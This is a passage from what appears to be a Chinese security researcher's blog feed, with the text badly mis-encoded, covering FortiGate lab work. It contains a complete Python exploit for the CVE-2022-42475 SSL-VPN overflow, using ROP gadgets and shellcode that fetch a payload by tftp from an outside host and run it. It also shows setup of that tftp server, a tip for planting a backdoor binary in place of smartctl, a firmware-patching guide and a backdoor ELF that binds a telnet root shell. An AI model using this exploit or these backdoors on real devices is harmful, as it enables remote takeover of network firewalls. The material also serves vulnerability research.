&#125;);                            &#125;catch(ex)&#123;            console.log(&#39;ash create error&#39; + ex);        &#125;  &#125;else &#123;          console.log(&#39;busybox already download&#39;);          exp();            &#125;&#125;);</code></pre><p>æœ€ç»ˆ å†æ¬¡åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ‰§è¡Œ nodejs 1.js æˆåŠŸå®Œæˆåˆ©ç”¨</p><p>ä»€ä¹ˆï¼Ÿä½ çªç„¶äº§ç”Ÿç–‘é—®ï¼Ÿtftp æœåŠ¡å™¨æ€ä¹ˆæ­å»ºå‘¢ï¼Ÿï¼Ÿ</p><h3 id="TFTP-æœåŠ¡å™¨æ­å»º"><a href="#TFTP-æœåŠ¡å™¨æ­å»º" class="headerlink" title="TFTP æœåŠ¡å™¨æ­å»º"></a>TFTP æœåŠ¡å™¨æ­å»º</h3><pre><code>sudo apt-get install xinetdsudo apt-get install tftp tftpdsudo vim /etc/xinetd.d/tftp</code></pre><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ”¹ç›®å½•</p><pre><code>service tftp&#123;        socket_type             = dgram        protocol                = udp        wait                    = yes        user                    = root        server                  = /usr/sbin/in.tftpd    //æœåŠ¡ç¨‹åºè·¯å¾„        server_args             = -s /home/ios/tftpboot/    //å¯ä»¥è®¿é—®çš„tftpdæœåŠ¡å™¨ä¸‹çš„ç›®å½•        disable                 = no            //æ˜¯å¦å¼€æœºå¯åŠ¨        per_source              = 11        cps                     = 100 2        flags                   = IPv4&#125;</code></pre><p>æ–°å»ºç›®å½•</p><pre><code>mkdir /home/ios/tftpboot/æ¥ç€æŠŠéœ€è¦ç”¨åˆ°çš„ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶è¿›å»cp busybox /home/ios/tftpboot/cp 1.js /home/ios/tftpboot/</code></pre><p>æå®š</p><h3 id="æœ€ç»ˆç¨³å®šçš„-Real-EXPï¼ï¼ï¼"><a href="#æœ€ç»ˆç¨³å®šçš„-Real-EXPï¼ï¼ï¼" class="headerlink" title="æœ€ç»ˆç¨³å®šçš„ Real EXPï¼ï¼ï¼"></a>æœ€ç»ˆç¨³å®šçš„ Real EXPï¼ï¼ï¼</h3><pre><code>import socketimport timeimport sslfrom struct import packdef int_to_bytes(n, minlen=0):    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length.     &quot;&quot;&quot;    if n &gt; 0:        arr = []        while n:            n, rem = n &gt;&gt; 8, n &amp; 0xff            arr.append(rem)        b = bytearray(arr)    elif n == 0:        b = bytearray(b&#39;\x00&#39;)    else:        raise ValueError(&#39;Only non-negative values supported&#39;)    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?        b = (minlen-len(b)) * &#39;\x00&#39; + b    return bdef setp1():    print(&quot;current step: download 1.js&quot;)    path = &quot;/remote/login&quot;.encode()    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret                print(len(payload))        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4                raw += b&#39;H\x81\xec\x00\x10\x00\x00j\x00H\xbboctet\x00\x00\x00SI\x89\xe1H\xc7\xc3get\x00SI\x89\xe0H\xc7\xc31.jsSH\x89\xe1H\xbb109.128\x00SH\xbb192.168.SH\x89\xe2H\xc7\xc3p\x00\x00\x00SH\xbb/bin/tftSH\x89\xe6H\x89\xe7j\x00H\xbb/sbin/buSI\x89\xe2H\x05\x90\x00\x00\x00H\x89\xc4ARH\x83\xec\x08\x90\xc3&#39;        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl                        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)    except Exception as e:        print(e)def setp2():    print(&quot;current step: execute 1.js&quot;)    path = &quot;/remote/login&quot;.encode()    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0xfffffffffffa9688) # offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7               payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret                print(len(payload))        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4        # ret2shellcode        raw += b&#39;H\x81\xec\x00\x10\x00\x00H\xc7\xc1\x00\x00\x00\x00H\xbb/sbin/buSH\x89\xe2H\xc7\xc3e\x00\x00\x00SH\xbb/bin/nodSH\x89\xe6H\x89\xe7H\x83\xc0@H\x89\xc4\x90\x90\x90\xc3&#39;        # rop to execl        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl                        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        _socket.connect((&quot;192.168.109.111&quot;, 4443))        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)        _socket = _default_context.wrap_socket(_socket)        _socket.sendall(data)    except Exception as e:        print(e)def main():    #step1 = b&quot;tftp 192.168.109.128 1.js get octet /sbin/bu&quot;    for i in range(10):        time.sleep(0.1)        setp1()    #step2 = b&quot;/bin/node /sbin/bu&quot;    time.sleep(10) #wait for sslvpn reboot    for i in range(10):        time.sleep(0.1)        setp2()main()</code></pre><h3 id="å¯èƒ½å­˜åœ¨çš„é—®é¢˜"><a href="#å¯èƒ½å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="å¯èƒ½å­˜åœ¨çš„é—®é¢˜"></a>å¯èƒ½å­˜åœ¨çš„é—®é¢˜</h3><ol><li>å‘é€ exp å¤±è´¥ï¼Œéœ€è¦ä½ç‰ˆæœ¬çš„ python+ ä½ç‰ˆæœ¬çš„ linux ç¯å¢ƒï¼Œè¿™é‡Œç”¨çš„æ˜¯ python2</li><li>exp æ²¡ç”Ÿæ•ˆï¼Ÿ å¯ä»¥è€ƒè™‘æ‰“å®Œ step1 åç­‰å¾…ä¸€æ®µæ—¶é—´ 5-10s åå†æ‰§è¡Œ step2</li><li>ä¸ºä»€ä¹ˆè¦åˆ†å¼€æ„é€  shellcodeï¼Ÿä¸ºä½•ä¸ä¸€æ¬¡æ„é€ å®Œæˆ</li></ol><p>è¿™ä¹ˆè€ƒè™‘çš„ç‚¹æ˜¯è¿™æ ·çš„ï¼Œé¦–å…ˆæ‰§è¡Œ execl åä¼šåŠ«æŒç¨‹åºï¼Œæ‰§è¡ŒæˆåŠŸåä¸ä¼šè¿”å›é”™è¯¯ä¼šç›´æ¥é€€å‡ºç¨‹åºï¼Œè€Œä¸Šè¿° payload ä¸­æ²¡æœ‰ç”¨åˆ° fork æ¥åˆ›å»ºè¿›ç¨‹ï¼Œä»è€Œç¨‹åºæ‰§è¡Œå®Œ execl åä¼šé€€å‡ºï¼Œæ— æ³•ç»§ç»­è·³è½¬å›åŸæ¥çš„ payload ç»§ç»­ rop æˆ–è€… ret2shellcodeã€‚</p><ol><li>æœ‰æ²¡æœ‰ç®€å•çš„æ‹¿åé—¨æ–¹æ³•ï¼Ÿæœ‰æ›¿æ¢ smartctl ä¸ºä½ çš„åé—¨ binaryï¼Œæ¥ç€åœ¨ç™»å½•åæ‰§è¡Œ <code>diagnose hardware smartctl arg1 arg2 ...</code> çš„æ–¹å¼æ‰§è¡Œ</li></ol><p>è¿™é‡Œæä¾›ä¸€ä¸ªç®€å•çš„</p><pre><code>#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;# gcc -g -static s.c -o sint main(int argc, char const *argv[])&#123;        execl(argv[1], argv[1], argv[2], argv[3], argv[4], argv[5], argv[6], NULL);        return 0;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ&lt;a href=&quot;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&quot;&gt;è·å– shell è¿›é˜¶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º &lt;a href=&quot;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&quot;&gt;gdb-server é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;å¤ç°è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#å¤ç°è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;å¤ç°è¿‡ç¨‹&quot;&gt;&lt;/a&gt;å¤ç°è¿‡ç¨‹&lt;/h2&gt;&lt;p&gt;æ ¹æ®æ–‡ç«  &lt;a href=&quot;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&quot;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´æŒ–æ˜" scheme="http://ioo0s.art/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://ioo0s.art/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>gdb-serveré…ç½®</title>
    <link href="http://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/"/>
    <id>http://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/</id>
    <published>2023-02-09T02:35:27.000Z</published>
    <updated>2023-02-09T05:11:04.975Z</updated>
    
    <content type="html"><![CDATA[<p>éœ€è¦æ»¡è¶³ä»¥è·å– shellï¼Œæœªè·å–è¯·å‚è€ƒ<a href="https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">åˆ©ç”¨VMwareè·å–shell-è¿›é˜¶</a></p><span id="more"></span><ol><li>ä¸‹è½½ gdb-server static ç‰ˆæœ¬ï¼Œè¿™é‡Œé€‰æ‹©ä¸‹è½½ <code>gdbserver-7.10.1-x64</code></li></ol><p><a href="https://github.com/hugsy/gdb-static">gdb-static</a></p><ol><li>æ·»åŠ  gdb-server åˆ° rootfs ä¸­å¹¶é‡æ‰“åŒ…</li></ol><pre><code>cp /path/to/gdbserver-7.10.1-x64 ./bin/gdbserverchmod 777 ./bin/gdbserverchroot . /sbin/ftar -cf bin.tar ./binrm -rf bin.tar.xzchroot . /sbin/xz --check=sha256 -e bin.tarfind . -path &#39;./bin&#39; -prune -o -print |cpio -H newc -o &gt; ../make/rootfs.rawcd ../makecat rootfs.raw | gzip &gt; rootfs.gz</code></pre><ol><li>å¯åŠ¨ shell</li></ol><p>æ³¨æ„æˆ‘ä»¬èƒ½ä»å¤–è®¿é—®åˆ°å†…éƒ¨çš„ç«¯å£æ˜¯æœ‰é™çš„ï¼Œå»ºè®®ç”¨ ssh 22 ç«¯å£å’Œ telnet çš„ 23 ç«¯å£</p><pre><code>killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22</code></pre><p>é»˜è®¤ shell æ˜¯ 22 ç«¯å£ ,æ‰€ä»¥è°ƒè¯•ç«¯å£å°±ç”¨ 23ï¼Œä½¿ç”¨ busybox ps -a å‘½ä»¤æŸ¥çœ‹æ‰€æœ‰çš„è¿›ç¨‹ pidï¼Œç¡®å®š sslvpn çš„ pidï¼Œæ¥ç€å¹¶è¡Œæ‰§è¡Œä¸¤æ¡å‘½ä»¤é™„åŠ è°ƒè¯•</p><pre><code>killall telnetd &amp;&amp; gdbserver :23 --attach 1</code></pre><p>æ¥ç€ç”¨ gdb è¿œç¨‹è¿æ¥å³å¯</p><pre><code>target remote 192.168.109.111:23</code></pre><p>æœ€åå°±å¯ä»¥å¼€å¯æ„‰å¿«åœ°è°ƒè¯•ä¹‹æ—…äº†ï¼ï¼ï¼</p><p><img src="/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/boxcnwfkKKcpcZWwMd4RJsAnhWd.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;éœ€è¦æ»¡è¶³ä»¥è·å– shellï¼Œæœªè·å–è¯·å‚è€ƒ&lt;a href=&quot;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&quot;&gt;åˆ©ç”¨VMwareè·å–shell-è¿›é˜¶&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="åŸºç¡€çŸ¥è¯†" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>Note</title>
    <link href="http://ioo0s.art/2023/02/07/Note/"/>
    <id>http://ioo0s.art/2023/02/07/Note/</id>
    <published>2023-02-07T07:18:26.000Z</published>
    <updated>2023-02-07T08:15:04.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¼€åšåŸå› "><a href="#å¼€åšåŸå› " class="headerlink" title="å¼€åšåŸå› "></a>å¼€åšåŸå› </h2><p>æœ€è¿‘çªç„¶æƒ³åˆ†äº«å‡ ç¯‡å¥½ç©çš„æ–‡ç« ï¼Œå°è¯•åœ¨csdnä¸­å‘å¸ƒï¼ˆæ¶‚çœäº‹ï¼‰ï¼Œä½†é¢‘ç¹æç¤ºæˆ‘å®¡æ ¸å¤±è´¥æœ€ç»ˆé€‰æ‹©é‡æ–°å¼€ä¸€ä¸‹åšå®¢ï¼Œåç»­ä¸å®šæœŸæ›´æ–°ğŸ˜†ğŸ˜†ğŸ˜†</p><h2 id="å†å²åšå®¢"><a href="#å†å²åšå®¢" class="headerlink" title="å†å²åšå®¢"></a>å†å²åšå®¢</h2><p>æœ‰å‡ ç¯‡è¿˜ä¸é”™çš„å†å²æ–‡ç« ï¼Œä½†å› ä¸ºåŸæ–‡.mdä¸¢å¤±çš„åŸå› åœ¨è¿™é‡Œè´´ä¸€ä¸‹ä¹‹å‰å‘å¸ƒçš„é“¾æ¥</p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/104583615">iosé€†å‘å…¥é—¨ç¬”è®°ï¼ˆè¯¦ç»†åˆ°å“­ï¼‰</a></p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/93474278">Revealè°ƒè¯•ç¬”è®°</a></p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/107724670">iosé€†å‘å…¥é—¨ç¬”è®°-HOOK-QQç™»å½•</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å¼€åšåŸå› &quot;&gt;&lt;a href=&quot;#å¼€åšåŸå› &quot; class=&quot;headerlink&quot; title=&quot;å¼€åšåŸå› &quot;&gt;&lt;/a&gt;å¼€åšåŸå› &lt;/h2&gt;&lt;p&gt;æœ€è¿‘çªç„¶æƒ³åˆ†äº«å‡ ç¯‡å¥½ç©çš„æ–‡ç« ï¼Œå°è¯•åœ¨csdnä¸­å‘å¸ƒï¼ˆæ¶‚çœäº‹ï¼‰ï¼Œä½†é¢‘ç¹æç¤ºæˆ‘å®¡æ ¸å¤±è´¥æœ€ç»ˆé€‰æ‹©é‡æ–°å¼€ä¸€ä¸‹åšå®¢ï¼Œåç»­ä¸å®šæœŸæ›´æ–°ğŸ˜†</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨VMwareè·å–shell-è¿›é˜¶</title>
    <link href="http://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/"/>
    <id>http://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/</id>
    <published>2023-02-07T02:24:18.000Z</published>
    <updated>2023-02-09T05:11:41.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="è§£åŒ…"><a href="#è§£åŒ…" class="headerlink" title="è§£åŒ…"></a>è§£åŒ…</h2><pre><code>gzip -d rootfs.gzsudo cpio -idmv &lt; ./rootfssudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xzsudo chroot . /sbin/ftar -xf /bin.tar</code></pre><h2 id="Patch-init-æ–‡ä»¶"><a href="#Patch-init-æ–‡ä»¶" class="headerlink" title="Patch init æ–‡ä»¶"></a>Patch init æ–‡ä»¶</h2><p>æ–‡ä»¶æ‰€åœ¨ä½ç½® <code>/bin/init</code> ,æ³¨æ„è¿™ä¸ªæ˜¯è§£åŒ…åæ‰èƒ½æ‹¿åˆ°çš„æ–‡ä»¶</p><p>patch ä½ç½®åœ¨ <code>0x04518E5</code></p><span id="more"></span><p><strong>å°†</strong><strong>jnz loc_451BB4</strong><strong> æ”¹ä¸º </strong><strong>jz loc_451BB4 </strong></p><p>ä¸‹å›¾æ˜¯ patch åçš„</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnp12KkCPJsgrJoFZ8uaZX15.png"></p><p>ä¼ªä»£ç </p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnPKVLs7SFq7xOzvSBaOiSTd.png"></p><p>å¦å¤–ä¸€å¤„ä¹Ÿéœ€è¦ patch</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnWZnG85SRFKyyydsEcCbI8b.png"></p><p>ä¿®æ”¹å‰</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnbIEedUGu0ily5S5emt7sL2.png"></p><p>ä¿®æ”¹å</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnwP6k0sGEU7X8Vi7zbcJHZc.png"></p><p>å¯¼å‡ºåæ›¿æ¢åŸæ¥çš„./bin/init æ–‡ä»¶</p><h2 id="Patch-shell"><a href="#Patch-shell" class="headerlink" title="Patch shell"></a>Patch shell</h2><ol><li>ä¸‹è½½ç¼–è¯‘ busybox</li></ol><p>ä¸‹è½½åœ°å€ï¼š<a href="https://busybox.net/downloads/">https://busybox.net/downloads/</a></p><ol><li>é¢„ç¼–è¯‘é…ç½®</li></ol><pre><code>make menuconfig</code></pre><ol><li>ä¿®æ”¹é…ç½®ä¿¡æ¯</li></ol><ul><li>Build Options â€”&gt; é€‰æ‹©[*] Build Busybox as a static binaryï¼ˆno shared libsï¼‰</li><li>å»æ‰ Coreutilsâ€”&gt;sync é€‰é¡¹</li></ul><ol><li>ç¼–è¯‘</li></ol><pre><code>make make install</code></pre><p>ç¼–è¯‘æˆåŠŸ busybox æ–‡ä»¶ä¼šåœ¨ <code>./_install/bin/busybox</code></p><ol><li>å¤åˆ¶ busybox åˆ° rootfs çš„/bin ç›®å½•ä¸‹</li></ol><pre><code>cp ../busybox/busybox-1.35.0/_install/bin/busybox ./bin/chmod 777 ./bin/busybox</code></pre><ol><li>åˆ é™¤åŸ sh è½¯é“¾å¹¶åˆ›å»º busybox è½¯é“¾</li></ol><pre><code>rm -rf ./bin/shls -n /bin/busybox sh</code></pre><h2 id="åé—¨åˆ¶ä½œ"><a href="#åé—¨åˆ¶ä½œ" class="headerlink" title="åé—¨åˆ¶ä½œ"></a>åé—¨åˆ¶ä½œ</h2><p>ç¼–è¯‘ä¸€æ®µå‘½ä»¤æ‰§è¡Œçš„ elf æ–‡ä»¶ï¼Œé‡‡ç”¨é™æ€é“¾æ¥,è¿™é‡Œæœ€å¥½ä½¿ç”¨ system è€Œä¸æ˜¯ execvï¼Œå› ä¸º system ä¼šé™„åŠ  init åçš„ç¯å¢ƒï¼Œexecv ä¸ä¼šã€‚å‰ä¸¤æ¡ç”¨äºæµ‹è¯• busybox æ˜¯å¦æ­£å¸¸ï¼Œåä¸€æ¡ç”¨äºæ·»åŠ ä¸ª shell</p><pre><code>#include &lt;stdio.h&gt;int tcp_port = 22;char *ip = &quot;192.168.109.143&quot;;void shell()&#123;                        system(&quot;/bin/busybox ls&quot;, 0, 0);        system(&quot;/bin/busybox id&quot;, 0, 0);        system(&quot;/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;, 0, 0);        return;&#125;int main(int argc, char const *argv[])&#123;        shell();        return 0;&#125;</code></pre><p>ç¼–è¯‘</p><pre><code>gcc -g shell.c -static -o shell</code></pre><h2 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h2><pre><code>sudo chroot . /sbin/ftar -cf bin.tar ./binsudo chroot . /sbin/xz --check=sha256 -e bin.tarsu rootfind . -path &#39;./bin&#39; -prune -o -print |cpio -H newc -o &gt; ../make/rootfs.rawcd ../makecat rootfs.raw | gzip &gt; rootfs.gz</code></pre><h2 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a>æ›¿æ¢</h2><p>ä½¿ç”¨æ–°è™šæ‹ŸæœºæŒ‚è½½å½“å‰ fortigate çš„è™šæ‹Ÿç£ç›˜ï¼Œ<code>æ·»åŠ -&gt;ç°æœ‰è™šæ‹Ÿç£ç›˜</code>ã€‚</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnapM1bapHSvqn0lW4C9yKrb.png"></p><p>å¯åŠ¨è¯¥è™šæ‹Ÿæœºåï¼Œæœç´¢åº”ç”¨ diskï¼Œé€‰æ‹©å¯¹åº”å¤§å°çš„è™šæ‹Ÿæœºç£ç›˜ï¼Œè¿™é‡Œæ˜¯ 2G çš„ï¼Œç„¶åé€‰æ‹©å¯åŠ¨æŒ‚è½½</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn7WU2xW82Oj1p5Hbwnay0pc.png"></p><p>æ›¿æ¢ rootfs.gz æ–‡ä»¶</p><pre><code>sudo sucp path/to/rootfs.gz ./</code></pre><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnUsHHryGKKYw1ESbN0QQQic.png"></p><p>å…³é—­æŒ‚è½½æˆ–è€…æŒ‚èµ·è™šæ‹Ÿæœº</p><h2 id="GDB-å†…æ ¸-Patch"><a href="#GDB-å†…æ ¸-Patch" class="headerlink" title="GDB å†…æ ¸ Patch"></a>GDB å†…æ ¸ Patch</h2><p>ç»•è¿‡ fgt_verifyï¼Œéœ€è¦ç»•è¿‡ä¸‹æ–¹è·³è½¬ jnzï¼Œå¯ä»¥åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹å¹¶ä¿®æ”¹ rax=0 ç»•è¿‡</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn5sAHD8KFpwProizAdJzQef.png"></p><p>é…ç½® vm è°ƒè¯•<a href="https://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/">åˆ©ç”¨VMwareè·å–shell</a></p><pre><code>gdbpwndbg&gt; file /home/ios/Fortigate/vmlinuz_elfpwndbg&gt; b*0xFFFFFFFF807AC11Cpwndbg&gt; target remote 192.168.109.1:12345pwndbg&gt; c</code></pre><p>è¿™é‡Œè®²è§£ä¸€ä¸ªæŠ€å·§ï¼šä»€ä¹ˆæ—¶å€™æ‰§è¡Œ <code>target remote 192.168.109.1:12345</code> ä¸‹æ–­ï¼Œç”±äºæˆ‘ä»¬è¦ patch çš„æ˜¯ vmlinuz ä¸­çš„éªŒè¯ï¼Œæ‰€ä»¥éœ€è¦åœ¨å±å¹•è¾“å‡º <code>Bootting the kernel</code> å 1-2 ç§’å†æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn7xNskTYXxPLewpZI9qYZgh.png"></p><p>è§¦å‘æ–­ç‚¹</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnBipQCMHQH0iaVktQHTemDe.png"></p><p>ä¿®æ”¹ rax=0</p><pre><code>set $rax=0</code></pre><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnStvMa3M1EAJ5EPzp81Pijd.png"></p><p>æµ‹è¯•èƒ½æˆåŠŸè¿è¡Œå¯åŠ¨</p><p><img 